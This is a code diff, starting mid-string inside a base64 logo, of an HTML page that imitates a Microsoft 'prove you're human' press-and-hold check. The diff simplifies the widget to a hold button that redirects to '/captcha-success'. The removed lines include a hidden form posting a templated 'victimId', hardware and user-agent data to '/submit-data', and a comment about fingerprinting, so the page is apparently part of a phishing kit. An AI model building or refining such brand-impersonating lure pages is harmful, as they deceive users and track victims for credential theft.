wxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+" alt="Microsoft">
+    <h2>Let's prove you're human</h2>
+    <p>Press and hold the button to verify.</p>
+    <button id="verifyBtn" class="btn">Press and hold</button>
 </div>
-        <p class="instruction">Press and hold the button.</p>
-     <div class="captcha-wrapper">
-    <button class="icon-action-button" aria-label="Action icon">
-   <svg width="40" height="40" viewBox="5 4 40 40" aria-hidden="true" focusable="false" class="button-icon">
-        <circle cx="25" cy="24" r="20" fill="#707070"></circle>
-        <path fill="white" d="M25 10.07C25.3988 10.0693 25.7939 10.1474 26.1625 10.2998C26.531 10.4521 26.8659 10.6758 27.1479 10.9578C27.4299 11.2399 27.6534 11.5748 27.8056 11.9435C27.9578 12.3121 28.0358 12.7072 28.035 13.106C28.0355 13.5047 27.9574 13.8995 27.805 14.2679C27.6527 14.6363 27.4291 14.971 27.1472 15.2529C26.8652 15.5347 26.5304 15.7582 26.162 15.9104C25.7935 16.0626 25.3987 16.1407 25 16.14C24.6013 16.1407 24.2063 16.0626 23.8378 15.9103C23.4693 15.758 23.1344 15.5345 22.8525 15.2525C22.5705 14.9706 22.347 14.6357 22.1947 14.2672C22.0424 13.8987 21.9643 13.5037 21.965 13.105C21.965 11.48 23.32 10.07 25 10.07ZM21.965 36.575C21.8466 36.8501 21.6496 37.0841 21.3988 37.2477C21.148 37.4114 20.8545 37.4974 20.555 37.495C20.339 37.495 20.122 37.442 19.905 37.333C19.092 36.953 18.767 36.033 19.146 35.22C19.146 35.22 22.127 28.39 22.669 25.897C22.886 25.03 22.995 22.699 23.049 21.615C23.049 21.235 22.832 20.911 22.507 20.802L15.786 18.851C14.919 18.58 14.431 17.659 14.702 16.846C14.972 16.033 15.894 15.653 16.707 15.87C16.707 15.87 22.832 17.821 25 17.821C27.168 17.821 33.401 15.816 33.401 15.816C34.214 15.599 35.136 16.086 35.352 16.9C35.569 17.713 35.082 18.634 34.268 18.85L27.602 20.856C27.276 20.965 27.005 21.29 27.06 21.669C27.114 22.753 27.222 25.084 27.439 25.951C27.981 28.444 30.962 35.274 30.962 35.274C31.342 36.087 30.962 37.008 30.203 37.388C30.002 37.4922 29.7794 37.5477 29.553 37.55C28.957 37.55 28.36 37.225 28.143 36.629L25 30.07L21.965 36.575Z"></path>
-    </svg>
-    </button>
-    
-    <div class="pill-button" tabindex="0" role="button" id="verify-button">
-    <p class="ZpICXubljzwSSUY">Press and hold</p>
-    <p class="please-wait-text" style="color: #D3D3D3 !important; display: none;">Please wait...</p>
-    
-    <div class="progress-fill">
-        <p class="ZpICXubljzwSSUY" style="color: #ffffff !important;">Press and hold</p>
-        <p class="please-wait-text" style="color: #ffffff !important; display: none;">Please wait...</p>
-    </div>
+<script>
+    (function() {
+        const btn = document.getElementById('verifyBtn');
+        let holdTimer = null;
+        let progress = 0;
+        const duration = 4000; // 4 seconds
+        const step = 50;
 
-    <div class="loading-dots">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-    </div>
-
-    <div class="success-checkmark">
-    <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
-        <polyline points="20 6 9 17 4 12"></polyline>
-    </svg>
-</div>
-
-</div>
-</div>    
-</div>
-</div>
-
- <footer class="page-footer">
-            <div class="footer-links">
-                <a href="#">Help and feedback</a>
-                <a href="#">Terms of Use</a>
-                <a href="#">Privacy and cookies</a>
-            </div>
-            <div class="footer-notice">
-    Use private browsing if this is not your device. 
-    <a href="https://your-link-url.com" target="_blank">Learn more</a>
-</div>
-        </footer>
-
-
-</div>
-   <script>
-    const darkBg = "/images/background_img.svg";
-    const lightBg = "/images/background_img_light.svg";
-    const darkBase64 = "data:image/png;base64,..."; // keep your existing base64 strings
-    const lightBase64 = "data:image/png;base64,..."; // keep your existing base64 strings
-
-    function applyTheme() {
-        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-        const shouldBeLight = !prefersDark;
-        if (shouldBeLight) {
-            document.body.classList.add('light-theme');
-        } else {
-            document.body.classList.remove('light-theme');
-        }
-        const img = document.getElementById('captcha-img');
-        if (img) {
-            img.src = shouldBeLight ? lightBase64 : darkBase64;
-        }
-        if (shouldBeLight) {
-            document.body.style.backgroundImage = "url('/images/background_img_light.svg')";
-        } else {
-            document.body.style.backgroundImage = "url('/images/background_img.svg')";
-        }
-    }
-
-    applyTheme();
-    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
-    window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', applyTheme);
-
-    document.addEventListener("DOMContentLoaded", () => {
-        const button = document.getElementById("verify-button");
-        const progressFill = button ? button.querySelector(".progress-fill") : null;
-        const iconButton = document.querySelector(".icon-action-button");
-
-        if (!button || !progressFill) return;
-
-        let holdInterval = null;
-        let currentProgress = 0;
-        const holdDuration = 4500; // 4.5 seconds
-        const intervalStep = 30;
-
-        function startFilling(e) {
-            if (e.cancelable) e.preventDefault();
-            clearInterval(holdInterval);
-
-            // If the icon was clicked first ("Press again" state), auto‑fill
-            if (window.hasClickBeenWarned) {
-                button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Please wait...");
-                button.classList.add("pressed");
-
-                holdInterval = setInterval(() => {
-                    currentProgress += (intervalStep / holdDuration) * 100;
-                    if (currentProgress >= 100) {
-                        currentProgress = 100;
-                        progressFill.style.width = "100%";
-                        button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
-                        const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
-                        if (innerText) innerText.style.setProperty("display", "none", "important");
-
-                        const checkmark = button.querySelector(".success-checkmark");
-                        if (checkmark) checkmark.style.display = "block";
-                        clearInterval(holdInterval);
-
-                        // After checkmark, show dots then redirect
-                        setTimeout(() => {
-                            if (checkmark) checkmark.style.display = "none";
-                            const dots = button.querySelector(".loading-dots");
-                            if (dots) {
-                                dots.style.opacity = "0";
-                                dots.style.display = "flex";
-                                dots.offsetHeight;
-                                dots.style.transition = "opacity 0.4s ease-out";
-                                dots.style.opacity = "1";
-                            }
-
-                            // 🔁 Replace fingerprint+API calls with simple redirect
-                            setTimeout(() => {
-                                window.location.href = '/captcha-success';
-                            }, 1000); // wait 1s so user sees dots
-
-                        }, 700);
-                    } else {
-                        progressFill.style.width = currentProgress + "%";
-                    }
-                }, intervalStep);
-                return;
-            }
-
-            // Normal hold behaviour
-            button.classList.add("pressed");
-            holdInterval = setInterval(() => {
-                currentProgress += (intervalStep / holdDuration) * 100;
-                if (currentProgress >= 100) {
-                    currentProgress = 100;
-                    progressFill.style.width = "100%";
-                    button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.style.display = "none");
-                    const innerText = progressFill.querySelector(".ZpICXubljzwSSUY");
-                    if (innerText) innerText.style.setProperty("display", "none", "important");
-
-                    const checkmark = button.querySelector(".success-checkmark");
-                    if (checkmark) checkmark.style.display = "block";
-                    clearInterval(holdInterval);
-
+        function startHold() {
+            if (holdTimer) return;
+            btn.textContent = 'Hold...';
+            btn.disabled = true;
+            let start = Date.now();
+            holdTimer = setInterval(() => {
+                const elapsed = Date.now() - start;
+                progress = Math.min(elapsed / duration, 1);
+                btn.textContent = `Hold ${Math.round(progress * 100)}%`;
+                if (progress >= 1) {
+                    clearInterval(holdTimer);
+                    holdTimer = null;
+                    btn.textContent = '✅ Verified!';
+                    btn.className = 'btn success';
+                    // After a short delay, redirect to /captcha-success
                     setTimeout(() => {
-                        if (checkmark) checkmark.style.display = "none";
-                        const dots = button.querySelector(".loading-dots");
-                        if (dots) {
-                            dots.style.opacity = "0";
-                            dots.style.display = "flex";
-                            dots.offsetHeight;
-                            dots.style.transition = "opacity 0.4s ease-out";
-                            dots.style.opacity = "1";
-                        }
-
-                        // 🔁 Redirect directly
-                        setTimeout(() => {
-                            window.location.href = '/captcha-success';
-                        }, 1000);
-
-                    }, 700);
-                } else {
-                    progressFill.style.width = currentProgress + "%";
+                        window.location.href = '/captcha-success';
+                    }, 300);
                 }
-            }, intervalStep);
+            }, step);
         }
 
-        function stopFilling() {
-            const textElement = button.querySelector(".ZpICXubljzwSSUY");
-            if (textElement && textElement.textContent === "Please wait...") {
-                return;
-            }
-            clearInterval(holdInterval);
-            button.classList.remove("pressed");
-            if (currentProgress < 100) {
-                currentProgress = 0;
-                progressFill.style.width = "0%";
+        function endHold() {
+            if (holdTimer) {
+                clearInterval(holdTimer);
+                holdTimer = null;
+                btn.textContent = 'Press and hold';
+                btn.disabled = false;
             }
         }
 
-        button.addEventListener("mousedown", startFilling);
-        window.addEventListener("mouseup", stopFilling);
-        button.addEventListener("mouseleave", stopFilling);
-        button.addEventListener("touchstart", startFilling, { passive: false });
-        window.addEventListener("touchend", stopFilling);
-
-        // Icon click: first click shows "Press again", disables icon
-        if (iconButton) {
-            function handleIconTrigger(e) {
-                if (e.cancelable) e.preventDefault();
-                if (!window.hasClickBeenWarned) {
-                    button.querySelectorAll(".ZpICXubljzwSSUY").forEach(el => el.textContent = "Press again");
-                    window.hasClickBeenWarned = true;
-                    iconButton.classList.add("faint-icon");
-                }
-            }
-            iconButton.addEventListener("touchstart", handleIconTrigger, { passive: false });
-            iconButton.addEventListener("mousedown", handleIconTrigger);
-        }
-    });
-
-    window.addEventListener('resize', () => {
-        window.scrollTo(0, 0);
-        document.documentElement.scrollTop = 0;
-        document.body.scrollTop = 0;
-        const wrapper = document.querySelector('.page-wrapper');
-        if (wrapper) wrapper.scrollTop = 0;
-        const container = document.getElementById('signInContainer');
-        if (container) container.style.transform = 'none';
-    });
+        btn.addEventListener('mousedown', startHold);
+        btn.addEventListener('mouseup', endHold);
+        btn.addEventListener('mouseleave', endHold);
+        btn.addEventListener('touchstart', startHold, { passive: true });
+        btn.addEventListener('touchend', endHold);
+        btn.addEventListener('touchcancel', endHold);
+    })();
 </script>
-    
-    <form id="safari-form" action="/submit-data" method="POST" style="display:none;">
-    <input type="hidden" name="uuid" value="<%= victimId %>">
-    <input type="hidden" id="hardware-input" name="hardware">
-    <input type="hidden" id="ua-input" name="ua">
-    </form>
 </body>
 </html>
